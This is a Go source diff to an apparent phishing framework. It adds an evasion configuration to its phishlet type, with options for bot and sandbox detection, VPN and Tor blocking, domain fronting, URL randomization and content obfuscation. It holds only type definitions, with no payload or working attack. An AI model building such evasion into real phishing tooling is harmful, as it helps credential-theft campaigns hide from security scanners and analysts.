@@ -34,6 +34,7 @@ type Phishlet struct {
 	
 	Conditions     []Condition     `json:"conditions,omitempty"`
 	MultiPageFlows []MultiPageFlow `json:"multi_page_flows,omitempty"`
+	Evasion        *EvasionConfig  `json:"evasion,omitempty" db:"evasion"`
 }
 
 type Condition struct {
@@ -147,4 +148,19 @@ type PhishletStats struct {
 	TotalPhishlets   int `json:"total_phishlets"`
 	EnabledPhishlets int `json:"enabled_phishlets"`
 	ActiveCampaigns  int `json:"active_campaigns"`
+}
+
+type EvasionConfig struct {
+	EnableBotFiltering    bool     `json:"enable_bot_filtering" yaml:"enable_bot_filtering" db:"enable_bot_filtering"`
+	AllowedCountries      []string `json:"allowed_countries" yaml:"allowed_countries" db:"allowed_countries"`
+	BlockVPN              bool     `json:"block_vpn" yaml:"block_vpn" db:"block_vpn"`
+	BlockTor              bool     `json:"block_tor" yaml:"block_tor" db:"block_tor"`
+	RandomizeURLs         bool     `json:"randomize_urls" yaml:"randomize_urls" db:"randomize_urls"`
+	SandboxDetection      bool     `json:"sandbox_detection" yaml:"sandbox_detection" db:"sandbox_detection"`
+	EnableDomainFronting  bool     `json:"enable_domain_fronting" yaml:"enable_domain_fronting" db:"enable_domain_fronting"`
+	FrontingDomains       []string `json:"fronting_domains" yaml:"fronting_domains" db:"fronting_domains"`
+	ObfuscateContent      bool     `json:"obfuscate_content" yaml:"obfuscate_content" db:"obfuscate_content"`
+	AntiAnalysis          bool     `json:"anti_analysis" yaml:"anti_analysis" db:"anti_analysis"`
+	CustomBlockedUAs      []string `json:"custom_blocked_uas" yaml:"custom_blocked_uas" db:"custom_blocked_uas"`
+	MaxRequestsPerMinute  int      `json:"max_requests_per_minute" yaml:"max_requests_per_minute" db:"max_requests_per_minute"`
 }
